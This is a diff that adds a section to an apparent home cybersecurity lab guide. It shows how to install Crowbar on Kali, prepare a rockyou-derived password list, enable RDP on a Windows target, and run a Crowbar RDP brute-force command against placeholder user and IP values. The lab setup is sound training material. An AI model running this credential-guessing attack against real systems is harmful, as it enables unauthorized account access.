@@ -438,4 +438,54 @@ After restarting the Windows 10 machine:
 This will allow you to access the Windows 10 machine as a domain user.
 
 
-## 
+## Installing Brute-Force attack tool
+
+1. Update and Upgrade Kali Linux:
+
+   ```sh
+   sudo apt-get update && sudo apt-get upgrade -y
+   ```
+2. Install Crowbar that is a tool used for brute force attacks:
+
+   ```sh
+   sudo apt-get install -y crowbar
+   ```
+3. Unzip the rockyou Wordlist File:
+
+   ```sh
+   sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+   ```
+4. If you don't want to use all the passwords, you can extract the first 20 lines from rockyou.txt and save them into passwords.txt using the command:
+
+   ```sh
+   head -n 20 /usr/share/wordlists/rockyou.txt > passwords.txt.
+   ```
+5. For the sake of this lab, you can also add the password of one of the users you created to the passwords.txt file.
+   
+#### Enabling RDP on the Target Windows
+
+  - On the target Windows machine, search for "PC" and go to Properties.
+  - Scroll down and click on Advanced system settings.
+  - Enter the administrator username and password if prompted.
+  - In the System Properties window, go to the Remote tab.
+  - Select Allow remote connections to this computer.
+
+     ![59](https://github.com/FrezsSec/Building-a-Cybersecurity-Lab-Active-Directory-Splunk-Atomic-Red-Team-and-Kali-Linux-Integration/assets/173344802/99d2458e-d33f-4bed-953f-8edf7c60fcab)
+
+  - Click on Select Users, then Add, and add the two usernames you previously created.
+
+     ![60](https://github.com/FrezsSec/Building-a-Cybersecurity-Lab-Active-Directory-Splunk-Atomic-Red-Team-and-Kali-Linux-Integration/assets/173344802/c227606a-b6b2-4cc0-bb6a-c66aa89f2dd4)
+
+  - Click OK, then Apply.
+
+Now we proceed with our brute force attack:
+
+5. Launch Crowbar and perform a brute-force attack on the target Windows machine using the RDP protocol.
+
+    ```sh
+    sudo crowbar -b rdp -u <username> -C passwords.txt -s <Target_IP>
+    ```
+
+   ![61](https://github.com/FrezsSec/Building-a-Cybersecurity-Lab-Active-Directory-Splunk-Atomic-Red-Team-and-Kali-Linux-Integration/assets/173344802/ee51aed8-4d85-44a9-b9a9-77abfa301f5c)
+
+
